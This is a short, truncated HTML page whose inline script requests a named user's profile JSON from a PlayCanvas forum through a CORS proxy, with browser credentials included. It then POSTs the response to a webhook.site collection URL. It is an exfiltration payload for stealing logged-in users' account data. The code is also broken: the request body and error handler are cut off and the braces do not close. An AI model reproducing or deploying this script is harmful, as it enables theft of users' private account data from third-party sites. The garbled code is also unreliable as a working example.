  <body>
    <script>
      const url = "https://cors-anywhere.herokuapp.com/https://forum.playcanvas.com/u/auxi.json?seen_popups[]=1&seen_popups[]=2&seen_popups[]=5&seen_popups[]=3";
     fetch(url, { credentials: "include" }) 
  .then(r => r.json())
  .then(data => {
    console.log("Got JSON:", data);

    return fetch("https://cors-anywhere.herokuapp.com/https://webhook.site/98deafd7-4699-4590-a84c-3f33e2e2c6cd", {
      method: "POST",

    alert("Error: " + err);
  });
